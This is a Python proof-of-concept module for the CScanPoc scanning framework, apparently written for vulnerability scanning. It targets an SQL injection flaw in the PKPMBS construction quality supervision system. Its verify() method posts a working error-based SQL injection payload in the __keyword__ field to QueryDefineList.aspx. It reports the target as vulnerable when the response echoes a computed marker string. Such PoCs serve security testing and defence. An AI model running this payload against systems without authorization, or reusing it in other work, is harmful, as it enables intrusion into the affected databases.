# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    poc_id = 'd1b50c74-bd08-4ba8-b500-8a2945f76523'
    name = 'PKPMBS建设工程质量监督系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-17'  # 漏洞公布时间
    desc = '''
        PKPMBS建设工程质量监督系统 /pkpmbs/CMQuery/CommonManager/QueryDefineList.aspx 存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PKPMBS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '071dd4f3-8398-48a0-a14f-cef8215fd813'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #ref: http://www.wooyun.org/bugs/wooyun-2010-0121058
            hh = hackhttp.hackhttp()
            payload = "/pkpmbs/CMQuery/CommonManager/QueryDefineList.aspx"
            postdata = "__keyword__=%27%20and%20convert%28nvarchar%2C8%2a9%2a7%2a68888%29%2b%27cccc%27%3C1%20and%20%27%25%27%3D%27"
            url = self.target + payload
            code, head,res, errcode, _url = hh.http(url,postdata)

            if code == 500 and '34719552cccc' in res:
                #security_hole(url+'----POST SQLi')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
